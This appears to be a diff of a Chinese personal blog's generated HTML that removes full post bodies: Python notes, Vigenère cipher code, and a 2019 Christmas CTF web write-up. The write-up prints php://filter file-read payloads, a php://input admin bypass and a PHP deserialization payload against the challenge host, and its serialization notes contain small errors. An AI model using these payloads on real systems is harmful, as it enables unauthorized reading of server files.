class="line">fh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看返回的编码格式</span></span><br><span class="line"><span class="builtin-name">print</span> r.encoding</span><br><span class="line"></span><br><span class="line"><span class="comment">#更改返回的编码格式</span></span><br><span class="line">r.encoding = <span class="string">"utf-8"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#添加header头</span></span><br><span class="line">headers = &#123;<span class="string">'user-agent'</span>: <span class="string">'my-aasdasdaspp/0.0.1'</span>, <span class="string">'asd'</span>:<span class="string">'hello world!'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改cookie</span></span><br><span class="line">cookies = dict(<span class="attribute">cookies_are</span>=<span class="string">'working'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获得响应头中的cookie</span></span><br><span class="line"><span class="builtin-name">print</span> r.cookies[<span class="string">'domain'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#如何发送post请求</span></span><br><span class="line">payload = &#123;<span class="string">'name'</span>: <span class="string">'loop'</span>, <span class="string">'age'</span>: <span class="string">'12'</span>&#125;</span><br><span class="line">r = requests.post(<span class="string">"http://httpbin.org/post"</span>, <span class="attribute">data</span>=payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置超时</span></span><br><span class="line">r = requests.<span class="builtin-name">get</span>(url, <span class="attribute">timeout</span>=5)</span><br><span class="line">r = requests.<span class="builtin-name">get</span>(url, <span class="attribute">timeout</span>=None)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用session</span></span><br><span class="line">conn = requests.session()</span><br><span class="line">r = conn.<span class="builtin-name">get</span>(url)</span><br><span class="line"><span class="builtin-name">print</span> r.request.headers</span><br><span class="line">r = conn.<span class="builtin-name">get</span>(url)</span><br><span class="line"><span class="builtin-name">print</span> r.request.headers</span><br><span class="line"></span><br><span class="line"><span class="comment">#请求方法</span></span><br><span class="line">r = requests.post(url, <span class="attribute">proxies</span>=proxies, <span class="attribute">headers</span>=headers, <span class="attribute">cookies</span>=cookies, <span class="attribute">verify</span>=<span class="literal">False</span>, <span class="attribute">data</span>=payload)</span><br></pre></td></tr></table></figure>
 
 
           
@@ -1339,96 +1432,18 @@
 
       
         
-          
-            <h3 id="python-day3-列表、元组、字典"><a href="#python-day3-列表、元组、字典" class="headerlink" title="python-day3 列表、元组、字典"></a>python-day3 列表、元组、字典</h3><h4 id="列表，"><a href="#列表，" class="headerlink" title="列表，"></a>列表，</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list1 = ['Google', 'Runoob', <span class="number">1997</span>, <span class="number">2000</span>];list2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ];list3 = [<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>,<span class="string">"d"</span>]</span><br></pre></td></tr></table></figure>
+          <h3 id="python-day3-列表、元组、字典"><a href="#python-day3-列表、元组、字典" class="headerlink" title="python-day3 列表、元组、字典"></a>python-day3 列表、元组、字典</h3><h4 id="列表，"><a href="#列表，" class="headerlink" title="列表，"></a>列表，</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list1 = ['Google', 'Runoob', <span class="number">1997</span>, <span class="number">2000</span>];list2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ];list3 = [<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>,<span class="string">"d"</span>]</span><br></pre></td></tr></table></figure>
 
 <p>列表下标从0开始</p>
 <h5 id="访问，"><a href="#访问，" class="headerlink" title="访问，"></a>访问，</h5><h5 id="删除"><a href="#删除" class="headerlink" title="删除,"></a>删除,</h5><p>del list[0];</p>
 <h5 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h5><p>len（list）长度；+连接；*重复；3 in list 判断是否存在；</p>
-<h5 id="访问，-1"><a href="#访问，-1" class="headerlink" title="访问，"></a>访问，</h5><p>：是之后，list[0:]，-号是从后往前；</p>
-<h5 id="嵌套："><a href="#嵌套：" class="headerlink" title="嵌套："></a>嵌套：</h5><p>x=[],n=[],y=[x,n];</p>
-<h5 id="函数："><a href="#函数：" class="headerlink" title="函数："></a>函数：</h5><p> len(),max/min(),</p>
-<h5 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h5><p>list.append(obj)在列表末尾添加新的对象<br>list.count(obj)统计某个元素在列表中出现的次数<br>list.extend(seq)在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）<br>list.index(obj)从列表中找出某个值第一个匹配项的索引位置<br>list.insert(index, obj)将对象插入列表<br>list.pop([index=-1])移除列表中的一个元素（默认最后一个元素），并且返回该元素的值<br>list.remove(obj)移除列表中某个值的第一个匹配项<br>list.reverse()反向列表中元素<br>list.sort( key=None, reverse=False)对原列表进行排序<br>list.clear()清空列表<br>list.copy()复制列表</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list = [<span class="string">1,2,3,4</span>]list.append('name')print(list)print(len(list))print(list*4)list.remove('name')print(list)for i in list:    print(i)n = [<span class="string">1,2</span>]x = [<span class="string">1,2,3</span>]list = [<span class="string">n,x</span>]print(list)print(list[<span class="string">0</span>][<span class="symbol">1</span>])//[<span class="string">1, 2, 3, 4, 'name'</span>]5[<span class="string">1, 2, 3, 4, 'name', 1, 2, 3, 4, 'name', 1, 2, 3, 4, 'name', 1, 2, 3, 4, 'name'</span>][<span class="symbol">1, 2, 3, 4</span>]1234[[1, 2], [1, 2, 3]]2</span><br></pre></td></tr></table></figure>
-
-<h4 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h4><p>Python 的元组与列表类似，不同之处在于元组的元素不能修改。</p>
-<h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">tup1</span>=(<span class="string">'z'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>)tup2=(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)tup3=<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>print(<span class="keyword">type</span>(tup3))</span><br></pre></td></tr></table></figure>
-
-<p>空元组：tup1=（）；</p>
-<p>元组中只包含一个元素时，需要在元素后面添加逗号，否则括号会被当作运算符使用：</p>
-<h5 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h5><p>一样用[]；</p>
-<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tup1 = (<span class="string">'Google'</span>, <span class="string">'Runoob'</span>, <span class="number">1997</span>, <span class="number">2000</span>)tup2 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span> ) print (<span class="string">"tup1[0]: "</span>, tup1[<span class="number">0</span>])print (<span class="string">"tup2[1:5]: "</span>, tup2[<span class="number">1</span>:<span class="number">5</span>])</span><br></pre></td></tr></table></figure>
-
-<p>和列表一致，无法修改，除非重新赋值到另一个元组；</p>
-<p>无法删除，只可以全部删除</p>
-<p>空数组无法输出，输出会报错；</p>
-<h5 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h5><p>len();+;*;in ;for x in tup();</p>
-<p>id()查看元组地址；</p>
-<h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><p>字典是另一种可变容器模型，且可存储任意类型对象。</p>
-<p>字典的每个键值(key=&gt;value)对用冒号(<strong>:</strong>)分割，每个对之间用逗号(<strong>,</strong>)分割，整个字典包括在花括号(<strong>{})</strong>中；</p>
-<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;key1 : value1, key2 : value2 &#125;dict = &#123;'Alice': '<span class="number">2341</span>', 'Beth': '<span class="number">9102</span>', 'Cecil': '<span class="number">3258</span>'&#125;</span><br></pre></td></tr></table></figure>
-
-<h5 id="访问-1"><a href="#访问-1" class="headerlink" title="访问"></a>访问</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict = &#123;<span class="string">'Name'</span>: <span class="string">'Runoob'</span>, <span class="string">'Age'</span>: 7, <span class="string">'Class'</span>: <span class="string">'First'</span>&#125; <span class="builtin-name">print</span> (<span class="string">"dict['Name']: "</span>, dict[<span class="string">'Name'</span>])<span class="builtin-name">print</span> (<span class="string">"dict['Age']: "</span>, dict[<span class="string">'Age'</span>])</span><br></pre></td></tr></table></figure>
-
-<h5 id="修改字典"><a href="#修改字典" class="headerlink" title="修改字典"></a>修改字典</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dict = &#123;<span class="string">'Name'</span>: <span class="string">'Runoob'</span>, <span class="string">'Age'</span>: <span class="number">7</span>, <span class="string">'Class'</span>: <span class="string">'First'</span>&#125; dict[<span class="string">'Age'</span>] = <span class="number">8</span>               # 更新 Agedict[<span class="string">'School'</span>] = <span class="string">"菜鸟教程"</span>  # 添加信息</span><br><span class="line">del dict[<span class="string">'Name'</span>] # 删除键 <span class="string">'Name'</span>dict.clear()     # 清空字典del dict         # 删除字典</span><br></pre></td></tr></table></figure>
-
-<h5 id="字典特性"><a href="#字典特性" class="headerlink" title="字典特性"></a>字典特性</h5><p>1.不允许同一个键出现两次。创建时如果同一个键被赋值两次，后一个值会被记住，否则输入后定义的键值</p>
-<p>2.键必须不可变，所以可以用数字，字符串或元组充当，而用列表就不行，如下实例：</p>
-<h5 id="内置方法"><a href="#内置方法" class="headerlink" title="内置方法"></a>内置方法</h5><table>
-<thead>
-<tr>
-<th>1</th>
-<th><a href="https://www.runoob.com/python3/python3-att-dictionary-clear.html" target="_blank" rel="noopener">radiansdict.clear()</a> 删除字典内所有元素</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2</td>
-<td><a href="https://www.runoob.com/python3/python3-att-dictionary-copy.html" target="_blank" rel="noopener">radiansdict.copy()</a> 返回一个字典的浅复制</td>
-</tr>
-<tr>
-<td>3</td>
-<td><a href="https://www.runoob.com/python3/python3-att-dictionary-fromkeys.html" target="_blank" rel="noopener">radiansdict.fromkeys()</a>  创建一个新字典，以序列seq中元素做字典的键，val为字典所有键对应的初始值</td>
-</tr>
-<tr>
-<td>4</td>
-<td><a href="https://www.runoob.com/python3/python3-att-dictionary-get.html" target="_blank" rel="noopener">radiansdict.get(key, default=None)</a> 返回指定键的值，如果值不在字典中返回default值</td>
-</tr>
-<tr>
-<td>5</td>
-<td><a href="https://www.runoob.com/python3/python3-att-dictionary-in.html" target="_blank" rel="noopener">key in dict</a> 如果键在字典dict里返回true，否则返回false</td>
-</tr>
-<tr>
-<td>6</td>
-<td><a href="https://www.runoob.com/python3/python3-att-dictionary-items.html" target="_blank" rel="noopener">radiansdict.items()</a> 以列表返回可遍历的(键, 值) 元组数组</td>
-</tr>
-<tr>
-<td>7</td>
-<td><a href="https://www.runoob.com/python3/python3-att-dictionary-keys.html" target="_blank" rel="noopener">radiansdict.keys()</a> 返回一个迭代器，可以使用 list() 来转换为列表</td>
-</tr>
-<tr>
-<td>8</td>
-<td><a href="https://www.runoob.com/python3/python3-att-dictionary-setdefault.html" target="_blank" rel="noopener">radiansdict.setdefault(key, default=None)</a>     和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default</td>
-</tr>
-<tr>
-<td>9</td>
-<td><a href="https://www.runoob.com/python3/python3-att-dictionary-update.html" target="_blank" rel="noopener">radiansdict.update(dict2)</a> 把字典dict2的键/值对更新到dict里</td>
-</tr>
-<tr>
-<td>10</td>
-<td><a href="https://www.runoob.com/python3/python3-att-dictionary-values.html" target="_blank" rel="noopener">radiansdict.values()</a> 返回一个迭代器，可以使用 list() 来转换为列表</td>
-</tr>
-<tr>
-<td>11</td>
-<td><a href="https://www.runoob.com/python3/python3-att-dictionary-pop.html" target="_blank" rel="noopener">pop(key[,default])</a> 删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</td>
-</tr>
-<tr>
-<td>12</td>
-<td><a href="https://www.runoob.com/python3/python3-att-dictionary-popitem.html" target="_blank" rel="noopener"> popitem()</a> 随机返回并删除字典中的最后一对键和值。</td>
-</tr>
-</tbody></table>
-<p>input（）函数</p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/01/16/python3-%E5%88%97%E8%A1%A8%E5%85%83%E7%BB%84%E5%AD%97%E5%85%B8/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1721,200 +1736,19 @@
 
       
         
-          
-            <h1 id="2019圣诞ctf大旗大赛web-admin"><a href="#2019圣诞ctf大旗大赛web-admin" class="headerlink" title="2019圣诞ctf大旗大赛web-admin"></a>2019圣诞ctf大旗大赛web-admin</h1><p>打开题目查看源代码：</p>
+          <h1 id="2019圣诞ctf大旗大赛web-admin"><a href="#2019圣诞ctf大旗大赛web-admin" class="headerlink" title="2019圣诞ctf大旗大赛web-admin"></a>2019圣诞ctf大旗大赛web-admin</h1><p>打开题目查看源代码：</p>
 <p><img src="https://s2.ax1x.com/2019/12/26/lEZ8IK.png" alt="lEZ8IK.png"></p>
 <p>三个get值，user，file，pass；</p>
 <p>代码提示需要user=admin，file_get_contents()是post形式提交；</p>
 <p>这里要用到php://filter协议中的php://input;</p>
 <p>file提示我们打开class.php;</p>
-<p>pass暂时没有要求；</p>
-<p>构造payload;</p>
-<p><img src="https://s2.ax1x.com/2019/12/26/lEZ7JU.png" alt="lEZ7JU.png"></p>
-<p><img src="https://s2.ax1x.com/2019/12/26/lEZLQJ.png" alt="lEZLQJ.png"></p>
-<p>看到这里就想到应该是考察php：//filter协议了，class.php没显示，构造payload:</p>
-<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=<span class="symbol">php:</span>/<span class="regexp">/filter/convert</span>.base64-encode/resource=<span class="class"><span class="keyword">class</span>.<span class="title">php</span></span></span><br></pre></td></tr></table></figure>
-
-<p>base64解码：</p>
-<p><img src="https://s2.ax1x.com/2019/12/26/lEmZjJ.png" alt="lEmZjJ.png"></p>
-<p>要访问fffffflag.php；但并没有提示如何，尝试多次无果</p>
-<p>于是访问了下index.php；</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">120.55</span><span class="number">.43</span><span class="number">.255</span>:<span class="number">28119</span>/?<span class="keyword">user</span>=php://<span class="keyword">input</span>&amp;file=php://<span class="keyword">filter</span>/convert.base64-encode/resource=<span class="keyword">index</span>.php&amp;pass=<span class="number">1</span>post:<span class="keyword">admin</span></span><br></pre></td></tr></table></figure>
-
-<p>解码得：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL &amp; ~E_NOTICE);</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/fffffflag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">        $pass = unserialize($pass);</span><br><span class="line">        <span class="keyword">echo</span> $pass;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hava a rest and then change your choose."</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"> --</span><br></pre></td></tr></table></figure>
-
-<p>重点在：</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$user</span>)&amp;&amp;(file_get_contents(<span class="variable">$user</span>,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    echo <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/fffffflag/"</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        include(<span class="variable">$file</span>); <span class="regexp">//</span>class.php</span><br><span class="line">        <span class="variable">$pass</span> = unserialize(<span class="variable">$pass</span>);</span><br><span class="line">        echo <span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>这两句代码再结合之前的Read类，是要反序列化构建pass类才可以。</p>
-<p>构建payload:</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">user</span>=php://<span class="keyword">input</span>&amp;file=<span class="keyword">class</span>.php&amp;pass=O:<span class="number">4</span>:"Read":<span class="number">1</span>:&#123;s:<span class="number">4</span>:"file";s:<span class="number">62</span>:"php://filter/read=convert.base64-encode/resource=fffffflag.php";&#125;</span><br></pre></td></tr></table></figure>
-
-<p>得到flag;</p>
-<p><a href="https://imgchr.com/i/lEnaM4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/26/lEnaM4.md.png" alt="lEnaM4.md.png"></a></p>
-<p><img src="https://s2.ax1x.com/2019/12/26/lEnfLd.png" alt="lEnfLd.png"></p>
-<p>反序列化的过程：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"Read"</span>:<span class="number">1</span>&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">62</span>:<span class="string">"php://filter/read=convert.base64-encode/resource=fffffflag.php"</span>;&#125;</span><br><span class="line"></span><br><span class="line">O:<span class="number">4</span>:”Read” 指的是 类：个字符：Read</span><br><span class="line"></span><br><span class="line">:<span class="number">2</span>:  指的是 有两个对象</span><br><span class="line"></span><br><span class="line">S:<span class="number">4</span>:”\<span class="number">00</span>*\<span class="number">00</span>file”   指的是有个属性，有<span class="number">4</span>个字符，名为file</span><br><span class="line"></span><br><span class="line">s:<span class="number">62</span>:”flag.php”   指的是属性值，有<span class="number">62</span>个字符，值为			  php://filter/read=convert.base6-encode/resource=fffffflag.php</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-   
-	 <!-- 文章结束表示语-->
-    <div>
-      
-    </div>
-
-    
-
-    
-
-    
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/12/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="dele">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/1.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="deleのblog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/12/12/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/" itemprop="url">古典密码</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-12T20:33:30+08:00">
-                2019-12-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  
-                </span>
-              
-
-              
-
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h1><h2 id="——加密解密与破解"><a href="#——加密解密与破解" class="headerlink" title="——加密解密与破解"></a>——加密解密与破解</h2><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>  维吉尼亚是一种多表代换密码，是在Caesar 密码的基础上衍生出的加密算法，属于多表密码的一种简单形式，它是由一些偏移量不同的凯撒密码组成的。</p>
-<p><img src="https://s2.ax1x.com/2019/12/12/QyjSYQ.png" alt="QyjSYQ.png"></p>
-<p>  如图一样，0-25对应的是a-z（A-Z）；</p>
-<h2 id="加密："><a href="#加密：" class="headerlink" title="加密："></a>加密：</h2><p>形如 明文为a，秘钥为a，这加密为a;</p>
-<p>实际上就是（明文的ascii值+秘钥ASCII码）mod26；</p>
-<p>下面贴出核心C++代码:</p>
-<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="built_in">i</span>=<span class="number">0</span>;<span class="built_in">i</span>&lt;len;<span class="built_in">i</span>++)	</span><br><span class="line">&#123;			</span><br><span class="line">	flag=(key[<span class="built_in">i</span><span class="comment">%lenk]-'a')%26;//k[]为秘钥数组，lenk为秘钥长度；		</span></span><br><span class="line">    c[<span class="built_in">i</span>]=(m[<span class="built_in">i</span>]-<span class="string">'a'</span>+flag)<span class="comment">%26+'a';//加密后存住；					&#125;//加密；</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="解密："><a href="#解密：" class="headerlink" title="解密："></a>解密：</h2><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="built_in">i</span>=<span class="number">0</span>;<span class="built_in">i</span>&lt;len;<span class="built_in">i</span>++)</span><br><span class="line">		&#123;</span><br><span class="line">			flag=(key[<span class="built_in">i</span><span class="comment">%lenk]-'a')%26;</span></span><br><span class="line">			<span class="keyword">if</span>(c[<span class="built_in">i</span>]&gt;=key[<span class="built_in">i</span><span class="comment">%lenk])</span></span><br><span class="line">			   m[<span class="built_in">i</span>]=(c[<span class="built_in">i</span>]-<span class="string">'a'</span>-flag)<span class="comment">%26+'a';</span></span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">               m[<span class="built_in">i</span>]=(c[<span class="built_in">i</span>]+<span class="number">26</span>-<span class="string">'a'</span>-flag)+<span class="string">'a'</span>;</span><br></pre></td></tr></table></figure>
-
-<h2 id="破解："><a href="#破解：" class="headerlink" title="破解："></a>破解：</h2><h3 id="破解秘钥长度："><a href="#破解秘钥长度：" class="headerlink" title="破解秘钥长度："></a>破解秘钥长度：</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> c[<span class="number">500</span>]=<span class="string">""</span>;<span class="comment">//输入密文，要足够长满足条件； </span></span><br><span class="line">	 <span class="keyword">int</span> klen=<span class="number">1</span>;   <span class="comment">//密钥长度</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> clen=<span class="built_in">strlen</span>(c);   <span class="comment">//密文的长度 		     	</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">float</span> IC[klen]; <span class="comment">//重合指数</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">float</span> avgIC=<span class="number">0</span>;  <span class="comment">//平均重合指数</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;klen;i++)    <span class="comment">//统计分组字母个数 </span></span><br><span class="line"></span><br><span class="line">	&#123;		</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">int</span> out[<span class="number">26</span>]=&#123; <span class="number">0</span> &#125;;   <span class="comment">//盛放字母个数的数组</span></span><br><span class="line"></span><br><span class="line">		<span 